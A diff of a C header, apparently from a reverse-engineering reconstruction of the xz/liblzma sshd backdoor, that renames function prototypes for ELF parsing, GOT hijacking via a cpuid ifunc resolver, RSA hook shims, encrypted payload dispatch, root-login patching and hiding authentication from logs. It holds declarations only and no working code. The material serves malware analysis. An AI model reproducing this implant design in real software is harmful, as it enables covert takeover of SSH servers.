+ elf_parse_fn elf_info_parse;
 } elf_functions_t;
 
 /*
@@ -1742,36 +1742,36 @@ typedef struct __attribute__((packed)) instruction_search_ctx
  imported_funcs_t *imported_funcs;
 } instruction_search_ctx_t;
 
-extern BOOL sshd_proxy_elevate(monitor_data_t *args, global_context_t *ctx);
+extern BOOL sshd_monitor_cmd_dispatch(monitor_data_t *args, global_context_t *ctx);
 
-extern BOOL x86_dasm(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);
+extern BOOL x86_decode_instruction(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);
 
-extern BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);
+extern BOOL find_rel32_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);
 
-extern BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement);
+extern BOOL find_lea_with_displacement(u8 *code_start, u8 *code_end, u64 displacement);
 
-extern BOOL find_instruction_with_mem_operand(
+extern BOOL find_riprel_ptr_lea_or_mov_load(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
  void *mem_address
 );
 
-extern BOOL find_lea_instruction_with_mem_operand(
+extern BOOL find_riprel_lea(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
  void *mem_address
 );
 
-extern BOOL find_add_instruction_with_mem_operand(
+extern BOOL find_riprel_grp1_imm8_memref(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
  void *mem_address
 );
 
-extern BOOL find_mov_lea_instruction(
+extern BOOL find_riprel_mov_or_lea(
  u8 *code_start,
  u8 *code_end,
  BOOL is_64bit_operand,
@@ -1779,7 +1779,7 @@ extern BOOL find_mov_lea_instruction(
  dasm_ctx_t *dctx
 );
 
-extern BOOL find_mov_instruction(
+extern BOOL find_riprel_mov(
  u8 *code_start,
  u8 *code_end,
  BOOL is_64bit_operand,
@@ -1787,7 +1787,7 @@ extern BOOL find_mov_instruction(
  dasm_ctx_t *dctx
 );
 
-extern BOOL find_instruction_with_mem_operand_ex(
+extern BOOL find_riprel_opcode_memref_ex(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
@@ -1795,26 +1795,26 @@ extern BOOL find_instruction_with_mem_operand_ex(
  void *mem_address
 );
 
-extern BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part);
+extern BOOL is_endbr32_or_64(u8 *code_start, u8 *code_end, u32 low_mask_part);
 
-extern u8 *find_string_reference(
+extern u8 *find_string_lea_xref(
  u8 *code_start,
  u8 *code_end,
  const char *str
 );
 
-extern u8 *elf_find_string_reference(
+extern u8 *elf_find_encoded_string_xref_site(
  elf_info_t *elf_info,
  EncodedStringId encoded_string_id,
  u8 *code_start,
  u8 *code_end
 );
 
-extern BOOL find_reg2reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);
+extern BOOL find_reg_to_reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);
 
-extern BOOL find_function_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);
+extern BOOL find_endbr_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);
 
-extern BOOL find_function(
+extern BOOL find_function_bounds(
  u8 *code_start,
  void **func_start,
  void **func_end,
@@ -1822,90 +1822,90 @@ extern BOOL find_function(
  u8 *code_end,
  FuncFindType find_mode);
 
-extern BOOL elf_contains_vaddr(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
+extern BOOL elf_vaddr_range_has_pflags(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
 
-extern BOOL elf_contains_vaddr_impl(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
+extern BOOL elf_vaddr_range_has_pflags_impl(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
 
-extern BOOL elf_contains_vaddr_relro(elf_info_t *elf_info, u64 vaddr, u64 size, BOOL require_relro);
+extern BOOL elf_vaddr_range_in_relro_if_required(elf_info_t *elf_info, u64 vaddr, u64 size, BOOL require_relro);
 
-extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+extern BOOL elf_info_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
 
-extern BOOL is_gnu_relro(Elf64_Word p_type, u32 addend);
+extern BOOL is_pt_gnu_relro(Elf64_Word p_type, u32 addend);
 
-extern BOOL main_elf_parse(main_elf_t *main_elf);
+extern BOOL main_elf_resolve_stack_end_if_sshd(main_elf_t *main_elf);
 
-extern char *check_argument(char arg_first_char, char* arg_name);
+extern char *argv_dash_option_contains_lowercase_d(char arg_first_char, char* arg_name);
 
-extern BOOL process_is_sshd(elf_info_t *elf, u8 *stack_end);
+extern BOOL sshd_validate_stack_argv_envp_layout(elf_info_t *elf, u8 *stack_end);
 
-extern BOOL elf_find_string_references(elf_info_t *elf_info, string_references_t *refs);
+extern BOOL elf_build_string_xref_table(elf_info_t *elf_info, string_references_t *refs);
 
-extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);
+extern Elf64_Sym *elf_gnu_hash_lookup_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);
 
-extern void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+extern void *elf_gnu_hash_lookup_symbol_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);
 
-extern void *elf_get_code_segment(elf_info_t *elf_info, u64 *pSize);
+extern void *elf_get_text_segment(elf_info_t *elf_info, u64 *pSize);
 
-extern void *elf_get_rodata_segment(elf_info_t *elf_info, u64 *pSize);
+extern void *elf_get_rodata_segment_after_text(elf_info_t *elf_info, u64 *pSize);
 
-extern void *elf_get_data_segment(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);
+extern void *elf_get_writable_tail_span(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);
 
-extern void *elf_get_reloc_symbol(
+extern void *elf_find_import_reloc_slot(
  elf_info_t *elf_info,
  Elf64_Rela *relocs,
  u32 num_relocs,
  u64 reloc_type,
  EncodedStringId encoded_string_id);
 
-extern void *elf_get_plt_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+extern void *elf_find_plt_reloc_slot(elf_info_t *elf_info, EncodedStringId encoded_string_id);
 
-extern void *elf_get_got_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+extern void *elf_find_got_reloc_slot(elf_info_t *elf_info, EncodedStringId encoded_string_id);
 
-extern Elf64_Rela *elf_find_rela_reloc(
+extern Elf64_Rela *elf_rela_find_relative_slot(
  elf_info_t *elf_info,
  void *target_addr,
  u8 *slot_lower_bound,
  u8 *slot_upper_bound,
  ulong *resume_index_ptr);
 
-extern Elf64_Relr *elf_find_relr_reloc(
+extern Elf64_Relr *elf_relr_find_relative_slot(
  elf_info_t *elf_info,
  void *target_addr,
  u8 *slot_lower_bound,
  u8 *slot_upper_bound,
  ulong *resume_index_ptr);
 
-extern BOOL elf_find_function_pointer(
+extern BOOL elf_find_function_ptr_slot(
  StringXrefId xref_id,
  void **pOutCodeStart, void **pOutCodeEnd,
  void **pOutFptrAddr, elf_info_t *elf_info,
  string_references_t *xrefs,
  global_context_t *ctx);
 
-extern char *elf_find_string(
+extern char *elf_find_encoded_string_in_rodata(
  elf_info_t *elf_info,
  EncodedStringId *stringId_inOut,
  void *rodata_start_ptr);
 
-extern lzma_allocator *get_lzma_allocator(void);
+extern lzma_allocator *get_fake_lzma_allocator(void);
 
-extern fake_lzma_allocator_t *get_lzma_allocator_address(void);
+extern fake_lzma_allocator_t *get_fake_lzma_allocator_blob(void);
 
-extern void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size);
+extern void *fake_lzma_alloc_resolve_symbol(void *opaque, size_t nmemb, size_t size);
 
-extern void fake_lzma_free(void *opaque, void *ptr);
+extern void fake_lzma_free_noop(void *opaque, void *ptr);
 
-extern elf_functions_t *get_elf_functions_address(void);
+extern elf_functions_t *get_elf_functions_table(void);
 
-extern BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);
+extern BOOL secret_data_append_opcode_bit(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);
 
-extern BOOL secret_data_append_from_code(
+extern BOOL secret_data_append_code_bits(
  void *code_start,
  void *code_end,
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, BOOL start_from_call);
 
-extern BOOL secret_data_append_item(
+extern BOOL secret_data_append_item_if_enabled(
  secret_data_shift_cursor_t shift_cursor,
  unsigned operation_index,
  unsigned shift_count,
@@ -1918,80 +1918,80 @@ typedef BOOL (*secret_data_appender_fn)(
   int index,
   u8 *code);
 
-extern BOOL secret_data_append_items(
+extern BOOL secret_data_append_items_batch(
  secret_data_item_t *items,
  u64 items_count,
  secret_data_appender_fn appender);
 
-extern BOOL secret_data_append_from_address(
+extern BOOL secret_data_append_bits_from_addr_or_ret(
  void *addr,
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, unsigned operation_index);
 
-extern BOOL secret_data_append_singleton(
+extern BOOL secret_data_append_singleton_bits(
  u8 *call_site, u8 *code,
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, unsigned operation_index);
 
-extern BOOL secret_data_append_from_call_site(
+extern BOOL secret_data_append_bits_from_call_site(
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, unsigned operation_index,
  BOOL bypass
 );
 
-extern BOOL backdoor_setup(backdoor_setup_params_t *params);
+extern BOOL backdoor_install_runtime_hooks(backdoor_setup_params_t *params);
 
-extern void init_ldso_ctx(ldso_ctx_t *ldso_ctx);
+extern void restore_ldso_audit_state(ldso_ctx_t *ldso_ctx);
 
-extern unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame);
+extern unsigned int cpuid_ifunc_resolver_entry(unsigned int cpuid_request, u64 *caller_frame);
 
-extern void * backdoor_init(elf_entry_ctx_t *state, u64 *caller_frame);
+extern void * cpuid_ifunc_patch_got_for_stage2(elf_entry_ctx_t *state, u64 *caller_frame);
 
-extern void init_elf_entry_ctx(elf_entry_ctx_t *ctx);
+extern void init_cpuid_ifunc_entry_ctx(elf_entry_ctx_t *ctx);
 
-extern void update_got_offset(elf_entry_ctx_t *ctx);
+extern void cache_got_base_offset_from_cpuid_anchor(elf_entry_ctx_t *ctx);
 
-extern void update_cpuid_got_index(elf_entry_ctx_t *ctx);
+extern void cache_cpuid_gotplt_slot_index(elf_entry_ctx_t *ctx);
 
-extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);
+extern BOOL cpuid_ifunc_stage2_install_hooks(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);
 
-extern BOOL resolve_libc_imports(
+extern BOOL resolve_libc_read_errno_imports(
  struct link_map *libc,
  elf_info_t *libc_info,
  libc_imports_t *imports
 );
 
-extern BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data);
+extern BOOL scan_shared_libraries_via_r_debug(backdoor_shared_libraries_data_t *data);
 
-extern BOOL process_shared_libraries_map(struct link_map *r_map, backdoor_shared_libraries_data_t *data);
+extern BOOL scan_link_map_and_init_shared_libs(struct link_map *r_map, backdoor_shared_libraries_data_t *data);
 
-extern BOOL chacha_decrypt(
+extern BOOL chacha20_decrypt(
  u8 *in, int inl,
  u8 *key, u8 *iv,
  u8 *out, imported_funcs_t *funcs
 );
 
-extern BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx);
+extern BOOL secret_data_decrypt_with_embedded_seed(u8 *output, global_context_t *ctx);
 
-extern BOOL is_range_mapped(u8* addr, u64 length, global_context_t* ctx);
+extern BOOL is_range_mapped_via_pselect(u8* addr, u64 length, global_context_t* ctx);
 
-extern u32 count_bits(u64 x);
+extern u32 popcount_u64(u64 x);
 
-extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);
+extern EncodedStringId encoded_string_id_lookup(const char *string_begin, const char *string_end);
 
-extern unsigned int _get_cpuid_modified(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);
+extern unsigned int get_cpuid_with_ifunc_bootstrap(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);
 
-extern void _cpuid_gcc(unsigned int level, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx);
+extern void cpuid_query_and_unpack(unsigned int level, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx);
 
-extern int init_hooks_ctx(backdoor_hooks_ctx_t *ctx);
+extern int hooks_ctx_init_or_wait_for_shared_globals(backdoor_hooks_ctx_t *ctx);
 
-extern int init_shared_globals(backdoor_shared_globals_t *shared_globals);
+extern int init_backdoor_shared_globals(backdoor_shared_globals_t *shared_globals);
 
-extern BOOL init_imported_funcs(imported_funcs_t *imported_funcs);
+extern BOOL libcrypto_imports_ready_or_install_bootstrap(imported_funcs_t *imported_funcs);
 
-extern void *update_got_address(elf_entry_ctx_t *entry_ctx);
+extern void *resolve_gotplt_base_from_tls_get_addr(elf_entry_ctx_t *entry_ctx);
 
-extern ptrdiff_t get_tls_get_addr_random_symbol_got_offset(elf_entry_ctx_t *ctx);
+extern ptrdiff_t seed_got_ctx_for_tls_get_addr_parse(elf_entry_ctx_t *ctx);
 
 /*
  * Standard glibc TLS index pair (module + offset) used when calling the loader’s `__tls_get_addr` trampoline from within the implant.
@@ -2006,7 +2006,7 @@ extern void *__tls_get_addr(tls_index *ti);
 
 extern void *dummy_tls_get_addr (tls_index *ti);
 
-extern void *j_tls_get_addr(tls_index *ti);
+extern void *tls_get_addr_trampoline(tls_index *ti);
 
 extern uintptr_t backdoor_symbind64(
  Elf64_Sym *sym,
@@ -2015,37 +2015,37 @@ extern uintptr_t backdoor_symbind64(
  unsigned int flags,
  const char *symname);
 
-extern BOOL run_backdoor_commands(RSA *key, global_context_t *ctx, BOOL *do_orig);
+extern BOOL rsa_backdoor_command_dispatch(RSA *key, global_context_t *ctx, BOOL *do_orig);
 
-extern BOOL find_dl_audit_offsets(
+extern BOOL resolve_ldso_audit_offsets(
  backdoor_data_handle_t *data,
  ptrdiff_t *libname_offset,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
 
-extern BOOL find_link_map_l_name(
+extern BOOL find_link_map_l_name_offsets(
  backdoor_data_handle_t *data_handle,
  ptrdiff_t *libname_offset,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
 
-extern BOOL find_dl_naudit(
+extern BOOL find_dl_naudit_slot(
  elf_info_t *dynamic_linker_elf,
  elf_info_t *libcrypto_elf,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
 
-extern BOOL find_link_map_l_audit_any_plt(
+extern BOOL find_l_audit_any_plt_mask_via_symbind_alt(
  backdoor_data_handle_t *data,
  ptrdiff_t libname_offset,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
 
-extern BOOL find_link_map_l_audit_any_plt_bitmask(
+extern BOOL find_l_audit_any_plt_mask_and_slot(
  backdoor_data_handle_t *data,
  instruction_search_ctx_t *search_ctx);
 
-extern BOOL sshd_get_sensitive_data_address_via_xcalloc(
+extern BOOL sshd_find_sensitive_data_base_via_xcalloc(
  u8 *data_start,
  u8 *data_end,
  u8 *code_start,
@@ -2053,7 +2053,7 @@ extern BOOL sshd_get_sensitive_data_address_via_xcalloc(
  string_references_t *string_refs,
  void **sensitive_data_out);
 
-extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(
+extern BOOL sshd_find_sensitive_data_base_via_krb5ccname(
  u8 *data_start,
  u8 *data_end,
  u8 *code_start,
@@ -2061,54 +2061,54 @@ extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(
  void **sensitive_data_out,
  elf_info_t *elf);
 
-extern int sshd_get_sensitive_data_score_in_demote_sensitive_data(
+extern int sshd_score_sensitive_data_candidate_in_demote_sensitive_data(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
 
-extern int sshd_get_sensitive_data_score_in_main(
+extern int sshd_score_sensitive_data_candidate_in_main(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
 
-extern int sshd_get_sensitive_data_score_in_do_child(
+extern int sshd_score_sensitive_data_candidate_in_do_child(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
 
-extern int sshd_get_sensitive_data_score(
+extern int sshd_score_sensitive_data_candidate(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
 
-extern BOOL bignum_serialize(
+extern BOOL bignum_mpint_serialize(
  u8 *buffer, u64 bufferSize,
  u64 *pOutSize,
  const BIGNUM *bn,
  imported_funcs_t *funcs);
 
-extern BOOL sshbuf_bignum_is_negative(struct sshbuf *buf);
+extern BOOL sshbuf_is_negative_mpint(struct sshbuf *buf);
 
-extern BOOL rsa_key_hash(
+extern BOOL rsa_pubkey_sha256_fingerprint(
  const RSA *rsa,
  u8 *mdBuf,
  u64 mdBufSize,
  imported_funcs_t *funcs);
 
-extern BOOL dsa_key_hash(
+extern BOOL dsa_pubkey_sha256_fingerprint(
  const DSA *dsa,
  u8 *mdBuf,
  u64 mdBufSize,
  global_context_t *ctx);
 
-extern BOOL sha256(
+extern BOOL sha256_digest(
  const void *data,
  size_t count,
  u8 *mdBuf,
  u64 mdBufSize,
  imported_funcs_t *funcs);
 
-extern BOOL verify_signature(
+extern BOOL verify_ed448_signed_payload(
  struct sshkey *sshkey,
  u8 *signed_data,
  u64 sshkey_digest_offset,
@@ -2118,7 +2118,7 @@ extern BOOL verify_signature(
  global_context_t *global_ctx
 );
 
-extern BOOL sshd_patch_variables(
+extern BOOL sshd_patch_permitrootlogin_usepam_and_hook_authpassword(
  BOOL skip_root_patch,
  BOOL disable_pam,
  BOOL replace_monitor_reqtype,
@@ -2126,20 +2126,20 @@ extern BOOL sshd_patch_variables(
  global_context_t *global_ctx
 );
 
-extern BOOL sshd_find_monitor_struct(
+extern BOOL sshd_find_monitor_ptr_slot(
  elf_info_t *elf,
  string_references_t *refs,
  global_context_t *ctx
 );
 
-extern BOOL sshd_find_main(
+extern BOOL sshd_find_main_from_entry_stub(
  u8 **code_start_out,
  elf_info_t *sshd,
  elf_info_t *libcrypto,
  imported_funcs_t *imported_funcs
 );
 
-extern BOOL sshd_find_monitor_field_addr_in_function(
+extern BOOL sshd_find_monitor_field_slot_via_mm_request_send(
  u8 *code_start,
  u8 *code_end,
  u8 *data_start,
@@ -2148,14 +2148,14 @@ extern BOOL sshd_find_monitor_field_addr_in_function(
  global_context_t *ctx
 );
 
-extern void *find_addr_referenced_in_mov_instruction(
+extern void *find_riprel_mov_load_target_in_range(
  StringXrefId id,
  string_references_t *refs,
  void *mem_range_start,
  void *mem_range_end
 );
 
-extern BOOL validate_log_handler_pointers(
+extern BOOL sshd_validate_log_handler_slots(
  void *addr1,
  void *addr2,
  void *search_base,
@@ -2172,102 +2172,102 @@ enum SocketMode {
  DIR_READ = 1
 };
 
-extern BOOL sshd_get_client_socket(
+extern BOOL sshd_get_monitor_comm_fd(
  global_context_t *ctx,
  int *pSocket,
  int socket_index,
  enum SocketMode socket_direction
 );
 
-extern BOOL sshd_get_usable_socket(int *pSock, int socket_index, libc_imports_t *imports);
+extern BOOL sshd_find_socket_fd_by_shutdown_probe(int *pSock, int socket_index, libc_imports_t *imports);
 
-extern BOOL sshd_get_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);
+extern BOOL sshd_find_forged_modulus_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);
 
-extern BOOL sshbuf_extract(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);
+extern BOOL sshbuf_extract_ptr_and_len(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);
 
-extern BOOL extract_payload_message(
+extern BOOL sshbuf_extract_rsa_modulus(
  struct sshbuf *sshbuf_data,
  size_t sshbuf_size,
  size_t *out_payload_size,
  global_context_t *ctx);
 
-extern BOOL decrypt_payload_message(
+extern BOOL payload_stream_decrypt_and_append_chunk(
  key_payload_t *payload,
  size_t payload_size,
  global_context_t *ctx);
 
-extern BOOL check_backdoor_state(global_context_t *ctx);
+extern BOOL payload_stream_validate_or_poison(global_context_t *ctx);
 
-extern int mm_answer_keyallowed_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+extern int mm_answer_keyallowed_payload_dispatch_hook(struct ssh *ssh, int sock, struct sshbuf *m);
 
-extern int mm_answer_keyverify_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+extern int mm_answer_keyverify_send_staged_reply_hook(struct ssh *ssh, int sock, struct sshbuf *m);
 
-extern int mm_answer_authpassword_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+extern int mm_answer_authpassword_send_reply_hook(struct ssh *ssh, int sock, struct sshbuf *m);
 
-extern void mm_log_handler_hook(
+extern void mm_log_handler_hide_auth_success_hook(
  LogLevel level,
  int forced,
  const char *msg,
  void *ctx);
 
-extern ssize_t fd_read(
+extern ssize_t fd_read_full(
  int fd,
  void *buffer,
  size_t count,
  libc_imports_t *funcs);
 
-extern ssize_t fd_write(
+extern ssize_t fd_write_full(
  int fd,
  void *buffer,
  size_t count,
  libc_imports_t *funcs);
 
-extern BOOL contains_null_pointers(
+extern BOOL pointer_array_has_null(
  void **pointers,
  unsigned int num_pointers
 );
 
-extern BOOL count_pointers(
+extern BOOL count_null_terminated_ptrs(
  void **ptrs,
  u64 *count_out,
  libc_imports_t *funcs
 );
 
-extern BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);
+extern BOOL sshd_install_mm_log_handler_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);
 
-extern int hook_RSA_public_decrypt(
+extern int rsa_public_decrypt_backdoor_shim(
  int flen, unsigned char *from,
  unsigned char *to, RSA *rsa, int padding);
 
-extern int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey, RSA *key);
+extern int evp_pkey_set1_rsa_backdoor_shim(EVP_PKEY *pkey, RSA *key);
 
-extern void hook_RSA_get0_key(
+extern void rsa_get0_key_backdoor_shim(
  const RSA *r,
  const BIGNUM **n,
  const BIGNUM **e,
  const BIGNUM **d);
 
-extern void sshd_log(
+extern void sshd_log_via_sshlogv(
  sshd_log_ctx_t *log_ctx,
  LogLevel level, const char *fmt, ...);
 
-extern BOOL sshd_find_sensitive_data(
+extern BOOL sshd_recon_bootstrap_sensitive_data(
  elf_info_t *sshd,
  elf_info_t *libcrypto,
  string_references_t *refs,
  imported_funcs_t *funcs,
  global_context_t *ctx);
 
-extern ssize_t c_strlen(
+extern ssize_t strlen_unbounded(
  char *str
 );
 
-extern ssize_t c_strnlen(
+extern ssize_t strnlen_bounded(
  char *str,
  size_t max_len
 );
 
-extern void* c_memmove(
+extern void* memmove_overlap_safe(
  char *dest,
  char *src,
  size_t cnt
